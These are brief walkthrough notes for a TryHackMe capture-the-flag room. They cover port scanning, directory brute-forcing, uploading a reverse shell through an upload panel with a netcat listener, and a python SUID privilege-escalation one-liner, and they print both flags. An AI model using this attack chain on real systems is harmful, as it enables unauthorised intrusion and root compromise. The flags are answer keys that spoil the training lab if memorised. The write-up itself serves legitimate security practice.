https://tryhackme.com/room/rrootme

- run nmap to discover open ports `nmap -sC -sV <IP>`:
	- 22: ssh
		- OpenSSH 7.6p1
	- 80: http
		- Apache httpd 2.4.29

- poke in webapp:
	- one page side, nothing interesting on code
	- gobuster:
		- `gobuster dir -u <IP> -w <wordlist>`
			- -> /css, /js, /uploads, /panel
			- insteresting is panel (uploadong files) and uploads 

- getting reverse shell
	- uploading reverse shell script - /panel
		- figure out possible extensions to upload
	- set listener `nc -lnvp 4444`
	- run the shell from /uploads
	- find a user.txt flag
		- `find / -name user.txt 2>/dev/null`
		- -> THM{y0u_g0t_a_sh3ll}

- root the machine
	- `sudo -l` -> nothing
	- get SUID files `find / -user root -perm /4000`
		- -> interesting: /usr/bin/python
		- exploit: `python -c 'import os; os.execl("/bin/sh","sh","-p")'`
			- if you don't have stable shell you get empty line but try `whoami`!!!
			- root flag: THM{pr1v1l3g3_3sc4l4t10n} 